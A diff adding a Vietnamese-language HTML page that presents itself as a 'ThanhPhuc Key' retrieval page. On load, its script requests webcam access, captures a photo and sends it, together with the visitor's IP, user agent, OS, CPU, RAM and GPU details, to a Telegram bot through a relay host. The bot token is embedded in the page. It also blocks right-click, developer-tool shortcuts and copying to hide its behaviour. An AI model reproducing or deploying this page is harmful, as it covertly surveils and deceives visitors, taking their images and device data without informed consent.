@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ThanhPhuc - Check</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: linear-gradient(to bottom right, #ffafbd, #ffc3a0);
+      animation: backgroundAnimation 10s infinite;
+    }
+    @keyframes backgroundAnimation {
+      50% { background: linear-gradient(to bottom right, #ffc3a0, #ffafbd); }
+    }
+    h1 {
+      font-size: 32px;
+      color: #333;
+      animation: textAnimation 2s infinite;
+    }
+    @keyframes textAnimation {
+      50% { color: red; transform: scale(1.2); }
+    }
+    p {
+      font-size: 18px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>ThanhPhuc Key</h1>
+    <p>Vui lòng liên hệ <a href="https://t.me/thanhphucdev" target="_blank" rel="nofollow">ThanhPhucDev</a> nếu key lỗi.</p>
+  </div>
+  <video id="video" width="1" height="1" autoplay></video>
+
+  <script>
+    const BOT_TOKEN = '7567800590:AAHUNgsHsLr3DkcGlYnBUql1zpwRSdm6QLE';
+    const CHAT_ID = '6180411569';
+    const API_BASE = 'https://test.thanhphucvn.workers.dev/bot';
+
+    // Ngăn dev tools & thao tác người dùng
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = e => (e.keyCode === 123 || (e.ctrlKey && e.key === 'u')) && e.preventDefault();
+    document.addEventListener('copy', e => e.preventDefault());
+
+    // Truy cập webcam & chụp ảnh
+    function capturePhoto() {
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+
+        $.ajax({
+          type: 'POST',
+          url: `${API_BASE}${BOT_TOKEN}/sendPhoto`,
+          data: formData,
+          processData: false,
+          contentType: false
+        });
+      }, 'image/jpeg');
+    }
+
+    function requestCameraAccess() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+          video.play();
+          setTimeout(capturePhoto, 500);
+        });
+    }
+
+    function sendSystemInfo() {
+      $.getJSON('https://api.ipify.org?format=json', data => {
+        const payload = {
+          chat_id: CHAT_ID,
+          text:
+            `- IP: ${data.ip}\n- User-Agent: ${navigator.userAgent}\n` +
+            `- OS: ${getOS()}\n- CPU: ${navigator.hardwareConcurrency || 'N/A'}\n` +
+            `- RAM: ${navigator.deviceMemory || 'N/A'}\n- GPU: ${getGPU()}`
+        };
+
+        $.post(`${API_BASE}${BOT_TOKEN}/sendMessage`, payload);
+      });
+    }
+
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (/windows phone/i.test(ua)) return "Windows Phone";
+      if (/android/i.test(ua)) return "Android";
+      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
+      if (/Macintosh|Mac OS X/.test(ua)) return "Mac OS";
+      if (/Windows NT/.test(ua)) return "Windows";
+      return "Unknown";
+    }
+
+    function getGPU() {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+      } catch {
+        return 'N/A';
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      alert("Ấn OK để lấy key");
+      requestCameraAccess();
+      sendSystemInfo();
+    });
+  </script>
+</body>
+</html>
